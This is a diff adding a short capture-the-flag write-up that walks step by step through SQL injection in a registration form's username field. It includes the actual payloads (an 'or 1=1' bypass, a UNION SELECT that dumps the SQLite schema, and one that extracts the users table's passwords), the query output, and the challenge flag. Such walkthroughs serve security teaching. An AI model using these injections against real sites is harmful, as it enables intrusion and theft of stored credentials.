@@ -1,0 +1,21 @@
+1- notice that the register page is the one where we can inject sql, by choosing an appropriate username such as "' or 1=1",
+when we login, we notice that all the posts are listed, not only our own (including post from admin). Of course this isn't enough and we need to find a way to get admin's password.
+
+2- when inputing an invalid query, an error message is given to us which gives us insight on how the qury is built:
+select id, user, post from posts where user = '' or 1=1 UNION SELECT 1 --';
+*the error here come from the fact that the number of columns is inappropriate and there is no table name
+
+3- We now know that there is 3 columns with the following type : id, text, text and a table named posts
+
+4- Knowing this information, we can input the following username to get the columns and table names:
+' and 1=2 UNION SELECT 1, sql, 3 FROM sqlite_master --
+*"and 1=2" is there so we only get the result from our own injection
+This is the result :
+1 	CREATE TABLE posts(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user text, post text) 	3
+1 	CREATE TABLE sqlite_sequence(name,seq) 	3
+1 	CREATE TABLE users(user text, pass text) 3
+Now we know that a table called users contains the users information.
+
+5- We can forge the following username which will give us the flag:
+' and 1=2 union select 1, user, pass from users --
+flag{union?_why_not_onion_a69464d4869c743e26c08df8686e4003}
